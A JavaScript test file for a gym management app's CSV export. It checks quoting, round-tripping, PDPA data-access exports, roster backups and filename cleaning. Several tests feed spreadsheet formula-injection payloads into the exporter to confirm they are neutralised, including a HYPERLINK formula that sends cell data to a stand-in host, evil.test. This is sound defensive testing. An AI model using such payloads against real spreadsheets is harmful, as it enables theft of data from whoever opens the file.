import { describe, it, expect } from "vitest";
import { csvCell, csvRows, memberCsv, rosterCsv, safeFilePart,
         memberCsvFilename, rosterCsvFilename, BOM } from "./csvExport.js";
import { parseCsv } from "./csvImport.js";

// This file leaves the building. It is handed to a member answering a PDPA
// access request, or to a gym taking its data elsewhere, so "roughly right" is
// not a standard it can be held to: a mangled name is a wrong answer to a
// statutory request, and an executed formula is a security bug in a document we
// told someone was their own record.

const members = [
  { id: "m1", name: "Sarah Chen",  email: "sarah@example.com", status: "active",    joinedAt: "2025-11-02" },
  { id: "m2", name: "Raj Kumar",   email: "",                  status: "paused",    joinedAt: "2026-01-15" },
  { id: "m3", name: "Mei Ling",    email: "mei@example.com",   status: "cancelled", joinedAt: "2024-06-30" },
];
const classes = [
  { id: "c1", name: "Tuesday 6pm", classType: "HIIT",     coachName: "Dylan", startsAt: "2026-07-14T10:00:00.000Z" },
  { id: "c2", name: "Hyrox sim",   classType: "Hyrox",    coachName: "Mara",  startsAt: "2026-07-16T10:00:00.000Z" },
];
const attendance = [
  { id: "a1", classInstanceId: "c1", memberId: "m1", source: "coach",  checkedInAt: "2026-07-14T10:02:00.000Z" },
  { id: "a2", classInstanceId: "c2", memberId: "m1", source: "import", checkedInAt: "2026-07-16T10:01:00.000Z" },
  { id: "a3", classInstanceId: "c1", memberId: "m2", source: "qr",     checkedInAt: "2026-07-14T10:05:00.000Z" },
];

describe("csvCell — RFC 4180 quoting", () => {
  it("leaves an ordinary value alone", () => {
    expect(csvCell("Sarah Chen")).toBe("Sarah Chen");
  });

  it("quotes a value containing a comma", () => {
    expect(csvCell("Chen, Sarah")).toBe('"Chen, Sarah"');
  });

  it("doubles embedded quotes and wraps the field", () => {
    expect(csvCell('Sarah "Speedy" Chen')).toBe('"Sarah ""Speedy"" Chen"');
  });

  it("quotes a value containing a newline", () => {
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"');
  });

  it("writes null and undefined as an empty field, not as the word", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(0)).toBe("0");
  });
});

describe("csvCell — formula injection", () => {
  // Reachable by anyone who can get a name onto a roster: the gym's own CSV
  // import creates members from whatever names the previous system held.
  it.each(["=1+1", "+SUM(A1)", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd"])(
    "neutralises a cell starting with %j", (raw) => {
      expect(csvCell(raw).replace(/^"/, "").startsWith("'")).toBe(true);
    });

  it("neutralises the classic exfiltration payload", () => {
    const out = csvCell('=HYPERLINK("http://evil.test?d="&A1,"Click")');
    expect(out.startsWith('"\'=')).toBe(true);      // guarded, then quoted
    expect(out.startsWith("=")).toBe(false);
  });

  // The guard has to go on before quoting, or the quote hides it from itself.
  it("guards before quoting, so a risky value that also needs quotes gets both", () => {
    expect(csvCell("=a,b")).toBe(`"'=a,b"`);
  });

  it("does not touch a value that merely CONTAINS an equals sign", () => {
    expect(csvCell("weight=80kg")).toBe("weight=80kg");
  });

  it("does not mangle an ordinary negative number's neighbours", () => {
    // A leading "-" is risky by the same rule spreadsheets apply, so it IS
    // guarded — pinned here so the behaviour is a decision, not a surprise.
    expect(csvCell("-5")).toBe("'-5");
    expect(csvCell("5-5")).toBe("5-5");
  });
});

describe("round-trip — what we write, our own reader reads back", () => {
  // The importer and the exporter are two halves of one format. Pinning the
  // round-trip is what stops them drifting apart silently.
  it("survives commas, quotes and newlines intact", () => {
    const original = [
      ["Name", "Note"],
      ["Chen, Sarah", 'she said "hi"'],
      ["Raj", "two\nlines"],
    ];
    const grid = parseCsv(csvRows(original));
    expect(grid).toEqual(original);
  });

  it("survives the BOM the exporter writes for Excel", () => {
    const grid = parseCsv(BOM + csvRows([["Name"], ["Mei Ling"]]));
    expect(grid[0][0]).toBe("Name");
  });

  it("re-reads an exported roster into the same names and emails", () => {
    const grid = parseCsv(rosterCsv(members, attendance));
    expect(grid[0]).toEqual(["Name", "Email", "Status", "Joined", "Visits", "Last seen", "Reference"]);
    expect(grid.slice(1).map(r => r[0])).toEqual(["Sarah Chen", "Raj Kumar", "Mei Ling"]);
    expect(grid[1][1]).toBe("sarah@example.com");
  });
});

describe("memberCsv — the answer to an access request", () => {
  const csv = memberCsv(members[0], attendance, classes, { gymName: "The Garage" });
  const grid = parseCsv(csv);
  const flat = grid.map(r => r.join("|"));

  it("returns null rather than a header-only file for a missing member", () => {
    expect(memberCsv(null, attendance, classes)).toBeNull();
  });

  it("names the gym holding the data, not Jungle alone", () => {
    expect(flat[0]).toMatch(/The Garage/);
  });

  it("carries every field held about the person", () => {
    expect(flat).toContain("Name|Sarah Chen");
    expect(flat).toContain("Email|sarah@example.com");
    expect(flat).toContain("Membership status|Active");
    expect(flat).toContain("Joined|2025-11-02");
  });

  it("lists only that member's check-ins, and all of them", () => {
    expect(flat).toContain("Classes attended|2");
    const rows = grid.filter(r => /^2026-07-/.test(r[0]));
    expect(rows).toHaveLength(2);
    expect(rows.map(r => r[2])).toEqual(["Tuesday 6pm", "Hyrox sim"]);
    // m2's check-in on the same class must not leak into m1's record.
    expect(csv).not.toMatch(/Raj Kumar/);
  });

  it("orders check-ins oldest first", () => {
    const dates = grid.filter(r => /^2026-07-/.test(r[0])).map(r => `${r[0]} ${r[1]}`);
    expect(dates).toEqual([...dates].sort());
  });

  it("says how each check-in was recorded, in words a member can read", () => {
    const rows = grid.filter(r => /^2026-07-/.test(r[0]));
    expect(rows[0][5]).toBe("Checked in by coach");
    expect(rows[1][5]).toBe("Imported from previous system");
  });

  it("states plainly when there is no attendance rather than showing an empty grid", () => {
    const empty = memberCsv(members[2], attendance, classes);
    expect(empty).toMatch(/No class attendance has been recorded/);
    expect(empty).toMatch(/Classes attended.0/);
  });

  it("handles a member with no email and a check-in against an unknown class", () => {
    const out = memberCsv(members[1], attendance, []);
    const g = parseCsv(out);
    expect(g.map(r => r.join("|"))).toContain("Email|");
    expect(g.filter(r => /^2026-07-/.test(r[0]))).toHaveLength(1);
  });

  it("starts with a BOM so Excel reads names as UTF-8", () => {
    expect(csv.startsWith(BOM)).toBe(true);
  });

  it("neutralises a formula smuggled in through a member's name", () => {
    const evil = { id: "x", name: '=HYPERLINK("http://evil.test")', email: "", status: "active" };
    const out = memberCsv(evil, [], []);
    expect(out).not.toMatch(/,=HYPERLINK/);
    expect(parseCsv(out).map(r => r.join("|"))).toContain(`Name|'=HYPERLINK("http://evil.test")`);
  });
});

describe("rosterCsv — portability and the gym's backup", () => {
  it("counts visits per member and reports the last time each was seen", () => {
    const g = parseCsv(rosterCsv(members, attendance));
    const byName = Object.fromEntries(g.slice(1).map(r => [r[0], r]));
    expect(byName["Sarah Chen"][4]).toBe("2");
    expect(byName["Sarah Chen"][5]).toBe("2026-07-16");
    expect(byName["Raj Kumar"][4]).toBe("1");
    // Never attended: a zero and a blank, not a fabricated date.
    expect(byName["Mei Ling"][4]).toBe("0");
    expect(byName["Mei Ling"][5]).toBe("");
  });

  it("uses plain words for status, never the raw enum", () => {
    const g = parseCsv(rosterCsv(members, attendance));
    expect(g.slice(1).map(r => r[2])).toEqual(["Active", "Paused", "Left"]);
  });

  it("includes members who have left by default — the history is theirs too", () => {
    expect(rosterCsv(members, attendance)).toMatch(/Mei Ling/);
  });

  it("can drop members who have left when asked", () => {
    const out = rosterCsv(members, attendance, { includeCancelled: false });
    expect(out).not.toMatch(/Mei Ling/);
    expect(out).toMatch(/Sarah Chen/);
  });

  it("writes a header-only file for an empty roster rather than throwing", () => {
    const g = parseCsv(rosterCsv([], []));
    expect(g).toHaveLength(1);
    expect(g[0][0]).toBe("Name");
  });

  it("survives junk in the lists", () => {
    expect(() => rosterCsv([null, undefined], [null, { memberId: null }])).not.toThrow();
  });
});

describe("filenames", () => {
  const day = new Date("2026-07-25T08:00:00.000Z");

  it("builds a readable name from the member and the date", () => {
    expect(memberCsvFilename(members[0], day)).toBe("Sarah-Chen-data-2026-07-25.csv");
  });

  it("strips everything a filesystem would choke on", () => {
    expect(safeFilePart('a/b\\c:d*e?f"g<h>i|j')).toBe("abcdefghij");
    expect(safeFilePart("  spaced   out  ")).toBe("spaced-out");
  });

  it("never produces a bare .csv when the name is empty or all punctuation", () => {
    expect(memberCsvFilename({ name: "" }, day)).toBe("member-data-2026-07-25.csv");
    expect(memberCsvFilename({ name: "///" }, day)).toBe("member-data-2026-07-25.csv");
    expect(memberCsvFilename(null, day)).toBe("member-data-2026-07-25.csv");
    expect(rosterCsvFilename("", day)).toBe("jungle-members-2026-07-25.csv");
  });

  it("uses the gym's name for the roster export", () => {
    expect(rosterCsvFilename("The Garage", day)).toBe("The-Garage-members-2026-07-25.csv");
  });

  it("caps a pathological name rather than emitting a 4KB filename", () => {
    expect(safeFilePart("x".repeat(500)).length).toBe(60);
  });
});

// ── SWEEP — the compliance surface, asked the hard question ──────────────────
//
// The tests above pin the FORMAT of what is written. None of them asks the
// question a statutory request actually asks: is this EVERYTHING? A compliance
// export is defined by what it omits, and an omission renders perfectly — the
// file opens, every column is populated, and the answer is still wrong.
//
// So this block drives the export off the store's real member shape rather than
// off a list retyped here. A field added to a member in six months' time fails
// this test until it is either exported or deliberately excluded, which is the
// only version of this guard that cannot go stale.
describe("SWEEP — does the access export hold everything the gym holds", () => {
  // Every field `store.js` puts on a member (see its "Local shape" comment and
  // `addMember`), populated. `id` is ours, not theirs — an internal key is not
  // personal data and is deliberately not on the document.
  const INTERNAL_ONLY = ["id"];
  // `status` IS disclosed, as the human label the member would recognise
  // ("Left", not "cancelled"), so a raw-value search is the wrong instrument for
  // it. Asserted by label below and by the format tests above.
  const BY_LABEL = ["status"];
  const FULL_MEMBER = {
    id: "m-full",
    name: "Priya Raman",
    email: "priya@example.com",
    status: "active",
    joinedAt: "2025-03-04",
    // The member's ID in the gym's PREVIOUS system. Editable in the roster
    // screen, synced to `members.external_ref`, and personal data by any
    // reading — it is an identifier for this person.
    externalRef: "GYMPASS-88213",
  };

  it("writes every member field the store holds, not just the ones it was built with", () => {
    const csv = memberCsv(FULL_MEMBER, [], [], { gymName: "The Garage" });
    const missing = Object.entries(FULL_MEMBER)
      .filter(([k, v]) => !INTERNAL_ONLY.includes(k) && !BY_LABEL.includes(k) && v)
      .filter(([, v]) => !csv.includes(String(v)))
      .map(([k]) => k);
    expect(missing, `held but not disclosed: ${missing.join(", ")}`).toEqual([]);
    expect(csv).toMatch(/Membership status,Active/);
  });

  // What the gym RECORDED ABOUT this member, as opposed to what the member did.
  // `retention_actions` (0008) is an append-only ledger of "we flagged her as
  // at-risk, we phoned her on the 4th, here is the note the coach left". That is
  // personal data held about an identifiable individual and it is the most
  // consequential thing in the system — it is a judgement that decides whether
  // someone gets called. An access request that returns attendance and silently
  // omits it answers the easy half.
  it("discloses the retention actions the gym recorded about them", () => {
    const actions = [
      { id: "r1", memberId: "m-full", rule: "absence", action: "acted",
        note: "Phoned — said she is travelling until August", occurredAt: "2026-07-04T02:00:00.000Z" },
      { id: "r2", memberId: "someone-else", rule: "absence", action: "dismissed",
        note: "not hers", occurredAt: "2026-07-05T02:00:00.000Z" },
    ];
    const csv = memberCsv(FULL_MEMBER, [], [], { gymName: "The Garage", retentionActions: actions });
    expect(csv).toMatch(/2026-07-04/);
    expect(csv).toMatch(/travelling until August/);
    // The same rule the roster export follows: one person's request must never
    // disclose another member's record.
    expect(csv).not.toMatch(/not hers/);
  });

  it("says so plainly when nothing was ever recorded about them", () => {
    const csv = memberCsv(FULL_MEMBER, [], [], { gymName: "The Garage", retentionActions: [] });
    expect(csv).toMatch(/No retention actions/i);
  });
});

describe("SWEEP — the roster export is portable, not just readable", () => {
  // The stated purpose of `rosterCsv` is portability and the gym's own backup.
  // A backup that drops a column is not a backup, and the column it drops here
  // is the one that links every member back to the system they came from.
  it("carries the external reference a re-import would need", () => {
    const csv = rosterCsv([{ id: "m1", name: "Priya Raman", email: "p@example.com",
                             status: "active", joinedAt: "2025-03-04", externalRef: "GYMPASS-88213" }], []);
    expect(csv).toMatch(/GYMPASS-88213/);
  });
});
